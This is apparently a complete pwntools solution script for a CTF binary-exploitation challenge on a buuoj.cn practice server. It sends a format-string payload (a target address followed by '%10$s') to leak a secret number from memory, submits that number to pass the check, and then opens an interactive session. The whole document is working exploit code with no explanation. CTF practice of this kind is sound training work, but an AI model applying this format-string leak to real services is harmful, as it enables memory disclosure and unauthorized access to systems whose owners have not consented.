from pwn import *

context.log_level = 'debug'
# io = process('pwn')
io = remote('node3.buuoj.cn', 27946)
number_addr = 0x0804C044

payload = p32(number_addr) + b'%10$s'
io.sendlineafter('your name:', payload)
io.recvn(10)
number = u32(io.recvn(4))
io.sendline(str(number))
io.interactive()
